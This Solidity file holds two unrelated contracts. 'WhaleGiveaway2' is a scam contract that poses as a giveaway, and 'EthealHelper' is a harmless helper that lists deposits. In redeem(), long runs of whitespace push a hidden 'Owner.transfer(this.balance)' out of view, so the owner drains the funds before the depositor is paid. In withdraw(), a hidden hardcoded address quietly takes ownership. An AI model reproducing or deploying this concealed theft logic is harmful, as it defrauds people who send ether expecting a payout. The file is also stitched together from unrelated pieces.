 

pragma solidity ^0.4.19;

contract WhaleGiveaway2
{
    address public Owner = msg.sender;
    uint constant public minEligibility = 0.999001 ether; 
   
    function()
    public
    payable
    {
        
    }
   
    function redeem()
    public
    payable
    {                                                                    
        if(msg.value>=minEligibility)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    Owner.transfer(this.balance);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           
            msg.sender.transfer(this.balance);
        }                                                                                                                
    }
    
    function withdraw()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b){Owner=0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }
    
    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == Owner);
         
        adr.call.value(msg.value)(data);
    }
}
contract iWhitelist {
    mapping(address => bool) public isWhitelisted;
}

contract iDeposit {
    uint256 public transactionCount;
    mapping (uint256 => Deposit) public transactions;
    iWhitelist public whitelist;
}

contract EthealHelper {
    function getTx(address _deposit, uint256 i) view public returns (uint256 amount, address beneficiary, uint64 time, bool cleared) {
        return iDeposit(_deposit).transactions(i);
    }
    
    function forwardable(address _deposit) view external returns (uint256[] ids) {
        iDeposit deposit = iDeposit(_deposit);
        uint256 _a = 0;
        address _b = 0x0;
        uint256 _t = 0;
        bool _c = false;
        uint256 i = 0;
        uint256 results = 0;
        uint256 txs = deposit.transactionCount();
        uint256[] memory _ids = new uint256[](txs);

        for (i = 0; i < txs; i++) {
            (_a, _b, _t, _c) = getTx(_deposit, i);
            if (!_c && deposit.whitelist().isWhitelisted(_b)) {
                _ids[results] = i;
                results++;
            }
        }

        ids = new uint256[](results);
        for (i = 0; i < results; i++) {
            ids[i] = _ids[i];
        }

        return ids;
    }
}
